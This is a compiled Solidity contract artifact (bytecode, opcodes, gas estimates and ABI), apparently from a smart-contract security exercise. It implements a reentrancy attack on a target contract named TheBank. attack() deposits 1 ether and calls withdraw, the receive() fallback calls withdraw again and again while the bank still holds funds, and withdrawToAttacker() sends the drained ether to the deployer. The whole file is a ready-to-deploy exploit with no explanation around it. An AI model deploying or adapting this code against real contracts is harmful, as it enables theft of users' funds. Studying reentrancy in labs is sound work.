{
	"data": {
		"bytecode": {
			"linkReferences": {},
			"object": "608060405234801561001057600080fd5b50604051610933380380610933833981810160405281019061003291906100ce565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610140565b6000815190506100c881610129565b92915050565b6000602082840312156100e057600080fd5b60006100ee848285016100b9565b91505092915050565b600061010282610109565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b610132816100f7565b811461013d57600080fd5b50565b6107e48061014f6000396000f3fe6080604052600436106100585760003560e01c8062113e081461012b5780630872dc411461015657806348eb76ee146101815780639e5faafc146101ac578063ad7a672f146101b6578063ff4707ee146101e157610126565b3661012657670de0b6b3a764000060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631106101245760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d4e932926040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561010b57600080fd5b505af115801561011f573d6000803e3d6000fd5b505050505b005b600080fd5b34801561013757600080fd5b506101406101f8565b60405161014d9190610673565b60405180910390f35b34801561016257600080fd5b5061016b610200565b60405161017891906105f8565b60405180910390f35b34801561018d57600080fd5b50610196610224565b6040516101a391906105dd565b60405180910390f35b6101b461024a565b005b3480156101c257600080fd5b506101cb6103a0565b6040516101d89190610673565b60405180910390f35b3480156101ed57600080fd5b506101f66103a8565b005b600047905090565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b670de0b6b3a7640000341015610295576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161028c90610653565b60405180910390fd5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b15801561030557600080fd5b505af1158015610319573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d4e932926040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561038657600080fd5b505af115801561039a573d6000803e3d6000fd5b50505050565b600047905090565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610438576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161042f90610633565b60405180910390fd5b60004790506000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1682604051610485906105c8565b60006040518083038185875af1925050503d80600081146104c2576040519150601f19603f3d011682016040523d82523d6000602084013e6104c7565b606091505b505090508061050b576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161050290610613565b60405180910390fd5b5050565b610518816106aa565b82525050565b610527816106e6565b82525050565b600061053a601b83610699565b91506105458261070a565b602082019050919050565b600061055d60008361068e565b915061056882610733565b600082019050919050565b6000610580601a83610699565b915061058b82610736565b602082019050919050565b60006105a3602483610699565b91506105ae8261075f565b604082019050919050565b6105c2816106dc565b82525050565b60006105d382610550565b9150819050919050565b60006020820190506105f2600083018461050f565b92915050565b600060208201905061060d600083018461051e565b92915050565b6000602082019050818103600083015261062c8161052d565b9050919050565b6000602082019050818103600083015261064c81610573565b9050919050565b6000602082019050818103600083015261066c81610596565b9050919050565b600060208201905061068860008301846105b9565b92915050565b600081905092915050565b600082825260208201905092915050565b60006106b5826106bc565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b60006106f1826106f8565b9050919050565b6000610703826106bc565b9050919050565b7f576974686472617720746f2061747461636b6572206661696c65640000000000600082015250565b50565b7f4f6e6c792061747461636b65722063616e207769746864726177000000000000600082015250565b7f6d7573742073656e64206174206c65617374203120657468657220746f20617460008201527f7461636b0000000000000000000000000000000000000000000000000000000060208201525056fea2646970667358221220b4fb1b1256c7eea65b57484cee3c071b46e26524eb8049d26d697102b30286db64736f6c63430008010033",
			"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x933 CODESIZE SUB DUP1 PUSH2 0x933 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x32 SWAP2 SWAP1 PUSH2 0xCE JUMP JUMPDEST DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP CALLER PUSH1 0x1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x140 JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0xC8 DUP2 PUSH2 0x129 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xE0 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0xEE DUP5 DUP3 DUP6 ADD PUSH2 0xB9 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x102 DUP3 PUSH2 0x109 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x132 DUP2 PUSH2 0xF7 JUMP JUMPDEST DUP2 EQ PUSH2 0x13D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH2 0x7E4 DUP1 PUSH2 0x14F PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x58 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH3 0x113E08 EQ PUSH2 0x12B JUMPI DUP1 PUSH4 0x872DC41 EQ PUSH2 0x156 JUMPI DUP1 PUSH4 0x48EB76EE EQ PUSH2 0x181 JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x1AC JUMPI DUP1 PUSH4 0xAD7A672F EQ PUSH2 0x1B6 JUMPI DUP1 PUSH4 0xFF4707EE EQ PUSH2 0x1E1 JUMPI PUSH2 0x126 JUMP JUMPDEST CALLDATASIZE PUSH2 0x126 JUMPI PUSH8 0xDE0B6B3A7640000 PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE LT PUSH2 0x124 JUMPI PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xD4E93292 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x10B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x11F JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x137 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x140 PUSH2 0x1F8 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x14D SWAP2 SWAP1 PUSH2 0x673 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x162 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x16B PUSH2 0x200 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x178 SWAP2 SWAP1 PUSH2 0x5F8 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x18D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x196 PUSH2 0x224 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x1A3 SWAP2 SWAP1 PUSH2 0x5DD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x1B4 PUSH2 0x24A JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1C2 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x1CB PUSH2 0x3A0 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x1D8 SWAP2 SWAP1 PUSH2 0x673 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1ED JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x1F6 PUSH2 0x3A8 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 SELFBALANCE SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH8 0xDE0B6B3A7640000 CALLVALUE LT ISZERO PUSH2 0x295 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x28C SWAP1 PUSH2 0x653 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xD0E30DB0 PUSH8 0xDE0B6B3A7640000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x305 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x319 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xD4E93292 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x386 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x39A JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 SELFBALANCE SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x438 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x42F SWAP1 PUSH2 0x633 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 SELFBALANCE SWAP1 POP PUSH1 0x0 PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH1 0x40 MLOAD PUSH2 0x485 SWAP1 PUSH2 0x5C8 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x4C2 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x4C7 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP1 PUSH2 0x50B JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x502 SWAP1 PUSH2 0x613 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP POP JUMP JUMPDEST PUSH2 0x518 DUP2 PUSH2 0x6AA JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x527 DUP2 PUSH2 0x6E6 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x53A PUSH1 0x1B DUP4 PUSH2 0x699 JUMP JUMPDEST SWAP2 POP PUSH2 0x545 DUP3 PUSH2 0x70A JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x55D PUSH1 0x0 DUP4 PUSH2 0x68E JUMP JUMPDEST SWAP2 POP PUSH2 0x568 DUP3 PUSH2 0x733 JUMP JUMPDEST PUSH1 0x0 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x580 PUSH1 0x1A DUP4 PUSH2 0x699 JUMP JUMPDEST SWAP2 POP PUSH2 0x58B DUP3 PUSH2 0x736 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x5A3 PUSH1 0x24 DUP4 PUSH2 0x699 JUMP JUMPDEST SWAP2 POP PUSH2 0x5AE DUP3 PUSH2 0x75F JUMP JUMPDEST PUSH1 0x40 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x5C2 DUP2 PUSH2 0x6DC JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x5D3 DUP3 PUSH2 0x550 JUMP JUMPDEST SWAP2 POP DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x5F2 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x50F JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x60D PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x51E JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x62C DUP2 PUSH2 0x52D JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x64C DUP2 PUSH2 0x573 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x66C DUP2 PUSH2 0x596 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x688 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x5B9 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x6B5 DUP3 PUSH2 0x6BC JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x6F1 DUP3 PUSH2 0x6F8 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x703 DUP3 PUSH2 0x6BC JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x576974686472617720746F2061747461636B6572206661696C65640000000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST POP JUMP JUMPDEST PUSH32 0x4F6E6C792061747461636B65722063616E207769746864726177000000000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH32 0x6D7573742073656E64206174206C65617374203120657468657220746F206174 PUSH1 0x0 DUP3 ADD MSTORE PUSH32 0x7461636B00000000000000000000000000000000000000000000000000000000 PUSH1 0x20 DUP3 ADD MSTORE POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xB4 0xFB SHL SLT JUMP 0xC7 0xEE 0xA6 JUMPDEST JUMPI 0x48 0x4C 0xEE EXTCODECOPY SMOD SHL CHAINID 0xE2 PUSH6 0x24EB8049D26D PUSH10 0x7102B30286DB64736F6C PUSH4 0x43000801 STOP CALLER "
		},
		"gasEstimates": {
			"creation": {
				"codeDepositCost": "404000",
				"executionCost": "infinite",
				"totalCost": "infinite"
			},
			"external": {
				"attack()": "infinite",
				"attacker()": "1236",
				"getBalances()": "317",
				"theBank()": "1254",
				"totalBalance()": "405",
				"withdrawToAttacker()": "infinite"
			}
		},
		"methodIdentifiers": {
			"attack()": "9e5faafc",
			"attacker()": "48eb76ee",
			"getBalances()": "00113e08",
			"theBank()": "0872dc41",
			"totalBalance()": "ad7a672f",
			"withdrawToAttacker()": "ff4707ee"
		}
	},
	"abi": [
		{
			"inputs": [
				{
					"internalType": "address",
					"name": "_thebankAddress",
					"type": "address"
				}
			],
			"stateMutability": "nonpayable",
			"type": "constructor"
		},
		{
			"inputs": [],
			"name": "attack",
			"outputs": [],
			"stateMutability": "payable",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "attacker",
			"outputs": [
				{
					"internalType": "address",
					"name": "",
					"type": "address"
				}
			],
			"stateMutability": "view",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "getBalances",
			"outputs": [
				{
					"internalType": "uint256",
					"name": "",
					"type": "uint256"
				}
			],
			"stateMutability": "view",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "theBank",
			"outputs": [
				{
					"internalType": "contract TheBank",
					"name": "",
					"type": "address"
				}
			],
			"stateMutability": "view",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "totalBalance",
			"outputs": [
				{
					"internalType": "uint256",
					"name": "",
					"type": "uint256"
				}
			],
			"stateMutability": "view",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "withdrawToAttacker",
			"outputs": [],
			"stateMutability": "nonpayable",
			"type": "function"
		},
		{
			"stateMutability": "payable",
			"type": "receive"
		}
	]
}